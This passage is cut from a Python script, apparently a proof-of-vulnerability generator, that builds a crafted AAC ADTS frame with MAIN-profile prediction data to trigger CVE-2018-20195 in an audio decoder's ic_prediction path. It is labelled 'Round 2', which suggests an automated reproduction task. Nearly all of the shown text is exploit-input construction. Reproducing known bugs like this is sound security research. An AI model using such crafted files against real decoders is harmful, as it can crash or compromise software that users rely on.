info\n    # Packing: 001 (ID_CPE) | 0000 (tag) | 0 (common_window) = 0x20\n    payload.append(0x20)\n    \n    # ICS Info for channel 1:\n    # ics_reserved_bit (1 bit) = 0\n    # window_sequence (2 bits) = 0 (ONLY_LONG_SEQUENCE)\n    # window_shape (1 bit) = 0\n    # max_sfb (6 bits) = 1 (minimal)\n    # Packing: 0 | 00 | 0 | 000001 = 0x01\n    payload.append(0x01)\n    \n    # predictor_data_present (1 bit) = 1 (MAIN profile needs this)\n    # predictor_reset (1 bit) = 0\n    # If predictor_data_present, need predictor data\n    # Packing: 1 | 0 | 000000 = 0x80\n    payload.append(0x80)\n    \n    # prediction_used for sfb 0 (1 bit) = 1\n    # Followed by padding and section data\n    payload.append(0x80)\n    \n    # Section data (simplified - all zero section)\n    # sect_cb (4 bits) = 0 (ZERO_HCB)\n    # sect_len (variable) - encode short section\n    for _ in range(10):\n        payload.append(0x00)\n    \n    # Scale factors (minimal)\n    for _ in range(5):\n        payload.append(0x00)\n    \n    # Pulse data not present (1 bit) = 0\n    # TNS data not present (1 bit) = 0  \n    # Gain control not present (1 bit) = 0\n    # Packing with padding\n    payload.append(0x00)\n    \n    # Spectral data (minimal - will be parsed)\n    for _ in range(20):\n        payload.append(0x00)\n    \n    # Repeat similar structure for channel 2 (paired channel)\n    # ICS Info for channel 2\n    payload.append(0x01)  # window info\n    payload.append(0x80)  # predictor_data_present=1\n    payload.append(0x80)  # prediction_used\n    \n    for _ in range(35):\n        payload.append(0x00)\n    \n    # ID_END (3 bits) = 0x7 to terminate raw_data_block\n    payload.append(0xE0)  # 111 (ID_END) | padding\n    \n    return bytes(payload)\n\ndef main():\n    print("Generating PoV for CVE-2018-20195 (Round 2)...")\n    \n    # Create ADTS frame with MAIN profile\n    # Profile: 0 (MAIN - required to reach ic_prediction)\n    # Sampling freq: 3 (48kHz)\n    # Channel config: 2 (ste